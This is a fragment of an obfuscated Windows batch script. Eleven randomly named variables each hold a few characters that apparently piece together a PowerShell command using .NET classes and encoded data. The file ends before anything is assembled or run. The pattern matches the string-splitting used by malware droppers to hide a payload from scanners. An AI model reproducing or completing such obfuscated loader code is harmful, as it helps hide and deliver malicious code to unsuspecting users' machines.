@echo off
set "BeARwScaFR=.Con"
set "pcYjXyfDJb=6esa"
set "sRmKvugZqK=ing("
set "CWhPOLXCBD=am;$"
set "wRkvMxIXBP=$dlN"
set "GxOFRVMMBz=Syst"
set "ZtKdURIotq=ejmU"
set "AlxSkwbEaa=GxI."
set "ZDYECQIJbp=..-1"
set "mPcafRSAhh=em.I"
set "VAuOOrBycP=);$d"
